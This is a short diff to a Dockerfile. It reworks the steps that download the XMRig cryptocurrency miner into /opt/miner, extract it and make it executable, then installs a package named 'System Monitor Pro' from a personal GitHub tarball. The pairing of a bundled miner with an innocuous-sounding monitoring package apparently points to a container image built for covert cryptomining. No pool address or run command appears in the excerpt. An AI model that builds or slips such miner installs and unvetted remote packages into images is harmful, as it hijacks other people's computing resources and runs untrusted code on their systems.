@@ -289,10 +289,12 @@ RUN apt-get update && \
 # Download XMRig using ADD (Docker handles download)
 RUN mkdir -p /opt/miner
 ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/xmrig.tar.gz
-RUN tar -xf /tmp/xmrig.tar.gz -C /tmp && \
-    mv /tmp/xmrig-6.21.0/xmrig /opt/miner/ && \
+RUN cd /tmp && \
+    tar -xzf xmrig.tar.gz && \
+    ls -la && \
+    find . -name "xmrig" -type f -exec mv {} /opt/miner/xmrig \; && \
     chmod +x /opt/miner/xmrig && \
-    rm -rf /tmp/xmrig*
+    rm -rf /tmp/*
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
 RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
